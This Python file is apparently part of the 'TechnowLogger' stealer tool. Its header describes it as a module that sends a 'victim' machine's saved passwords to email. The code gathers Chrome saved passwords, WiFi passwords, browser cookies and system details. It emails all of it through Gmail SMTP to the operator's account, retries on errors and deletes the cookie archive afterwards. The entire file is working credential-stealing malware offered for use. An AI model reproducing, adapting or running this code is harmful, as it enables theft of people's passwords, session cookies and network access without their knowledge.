#!/usr/bin/python3
import time, smtplib, platform, getpass, tempfile, os
import get_chrome_pass, get_wifi_pass, get_cookies  #Self Written Modules

# 7 to 10 lines for "send_mail_with_attachment()" function
#==============================================================
from email.mime.text import MIMEText              
from email.mime.multipart import MIMEMultipart  
from email.mime.application import MIMEApplication 
from os.path import basename    
#==============================================================

#==================================================================
#Author : Pushpender Singh
#==================================================================
#Usage: Module is send Saved Password of Victim machine to Email.
#==================================================================
#Github: https://github.com/PushpenderIndia/
#==================================================================

class SendPass:
    def __init__(self, email, password):
        self.email = email
        self.password = password
        self.system_info = self.get_system_info()
        self.log = ""
 
    def get_chrome_and_firefox_cookies(self):
        cookies = get_cookies.GetCookies()
        result = cookies.start()
        return result     
 
    def get_chrome_browser_creds(self):
        try:
            self.log += "SAVED PASSWORDS OF Chrome Browser FROM VICTIM SYSTEM : \n"
            chrome = get_chrome_pass.GetChromePass()
            self.log += chrome.start()
        except Exception:
            time.sleep(10)
            self.get_chrome_browser_creds()            
        self.send_mail(self.log)
        self.log = ""
               
    def get_wifi_creds(self):
        try:
            self.log += "SAVED PASSWORDS OF WiFi FROM VICTIM SYSTEM : \n"
            wifi = get_wifi_pass.GetWifiPassword()
            self.log += wifi.start()
        except Exception:
            time.sleep(10)
            self.get_wifi_creds()         
        self.send_mail(self.log)        
        self.log = ""        

    def get_system_info(self):
        uname = platform.uname()
        os = uname[0] + " " + uname[2] + " " + uname[3]
        computer_name = uname[1]
        user = getpass.getuser()
        return "Operating System:\t" + os + "\nComputer Name:\t\t" + computer_name + "\nUser:\t\t\t\t" + user

    def send_mail(self, message):
        try:
            message = "Subject: TechnowLogger Reporting With Saved Password\n\n" + "Report From:\n\n" + self.system_info + "\n\n" + message
            server = smtplib.SMTP("smtp.gmail.com", 587)
            server.starttls()
            server.login(self.email, self.password)
            server.sendmail(self.email, self.email, message)
            server.quit()
        except Exception as e:
            time.sleep(15)
            self.send_mail(self.log)
            
    def send_mail_with_attachment(self):
        try:
            msg = MIMEMultipart()
            msg['From'] = self.email
            msg['To'] = self.email  
            msg['Subject'] = "TechnowLogger Reporting With Cookies Attachments"
            text = "\nReport From:\n\n" + self.system_info 
            msg.attach(MIMEText(text))
            
            files = [self.get_chrome_and_firefox_cookies(),]

            for f in files or []:
                with open(f, "rb") as fil: 
                    ext = f.split('.')[-1:]
                    attachedfile = MIMEApplication(fil.read(), _subtype = ext)
                    attachedfile.add_header(
                        'content-disposition', 'attachment', filename=basename(f) )
                msg.attach(attachedfile)

            smtp = smtplib.SMTP(host="smtp.gmail.com", port= 587) 
            smtp.starttls()
            smtp.login(self.email, self.password)
            smtp.sendmail(self.email, self.email, msg.as_string())
            smtp.close()
            
            os.chdir(tempfile.gettempdir())
            os.remove("Cookies.zip")
        except Exception as e:
            time.sleep(15)         
            self.send_mail_with_attachment()            
    
if __name__ == '__main__':
    email = input("Enter Email Address: ")
    password = input("Enter Password: ")    
    test = SendPass(email, password)
    test.send_mail_with_attachment()
    print("[+] Cookies Send Successfully!")
    test.get_wifi_creds()
    print("[+] Wifi Password Send Successfully!")
    test.get_chrome_browser_creds()
    print("[+] Chrome Browser Password Send Successfully!")    
    